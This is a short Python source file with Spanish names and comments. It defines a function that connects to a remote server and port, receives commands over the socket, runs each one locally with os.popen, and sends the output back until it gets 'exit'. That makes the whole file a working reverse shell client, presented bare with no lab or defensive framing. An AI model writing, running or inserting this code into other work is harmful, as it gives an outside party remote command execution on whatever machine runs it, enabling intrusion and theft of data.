import socket
import os

def conectar_al_servidor(servidor, puerto):
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.connect((servidor, puerto))
    
    while True:
        try:
            comando = cliente.recv(1024).decode('utf-8')
            if comando.lower() == 'exit':
                break
            else:
                # Ejecuta el comando localmente y envía el resultado
                resultado = os.popen(comando).read()
                cliente.send(resultado.encode('utf-8'))
        except Exception as e:
            print("[-] Error al ejecutar el comando:", e)
            break

    cliente.close()
